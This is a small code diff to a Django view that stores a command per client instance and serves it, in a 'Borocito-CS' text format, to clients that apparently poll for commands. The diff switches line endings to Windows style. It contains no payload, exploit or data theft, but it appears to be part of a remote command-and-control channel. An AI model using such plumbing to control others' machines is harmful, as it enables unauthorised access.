@@ -57,11 +57,11 @@ def instance(request: HttpRequest):
         instancia.save(update_fields=['command', 'response'])
         return HttpResponse(f"OK! {instancia.uuid}", content_type="plain/text")
     elif request.method == "GET":
-        respuesta = str(f"#|Borocito-CS|{instancia.uuid}|{datetime.now().strftime("%H:%M:%S %d/%m/%Y")}\n")
-        respuesta += str(f"Command1>{instancia.command or ''}\n")
-        respuesta += str(f"Command2>\n")
-        respuesta += str(f"Command3>\n")
-        respuesta += str(f"[Response]\n")
+        respuesta = str(f"#|Borocito-CS|{instancia.uuid}|{datetime.now().strftime("%H:%M:%S %d/%m/%Y")}\r\n")
+        respuesta += str(f"Command1>{instancia.command or ''}\r\n")
+        respuesta += str(f"Command2>\r\n")
+        respuesta += str(f"Command3>\r\n")
+        respuesta += str(f"[Response]\r\n")
         return HttpResponse(respuesta, content_type="plain/text")
     return JsonResponse({"status": "METHOD_NOT_SUPPORTED"}, status=405)
 
